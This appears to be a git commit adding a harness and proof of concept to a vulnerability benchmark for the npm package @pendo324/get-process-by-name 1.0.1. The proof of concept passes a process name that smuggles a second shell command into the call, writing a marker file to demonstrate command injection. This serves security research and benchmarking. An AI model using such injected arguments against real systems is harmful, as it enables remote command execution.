b28eda06d29c8fc2aefab9b5d2db359281bca3b8
Filipe Marques <filipe.s.marques@tecnico.ulisboa.pt>
2026-05-19 14:49:55 +0100

    pendo324-get-process-by-name-1.0.1: complete and verified

---
+++ bench/packages/pendo324-get-process-by-name-1.0.1/harness.js
@@ -0,0 +1,3 @@
+const esl = require("esl_symbolic");
+const { getProcessByName } = require('@pendo324/get-process-by-name');
+getProcessByName(esl.string("payload"));
---
+++ bench/packages/pendo324-get-process-by-name-1.0.1/poc.js
@@ -0,0 +1,2 @@
+const { getProcessByName } = require('@pendo324/get-process-by-name');
+getProcessByName("python\" && echo \"1\"> rce.txt # ")
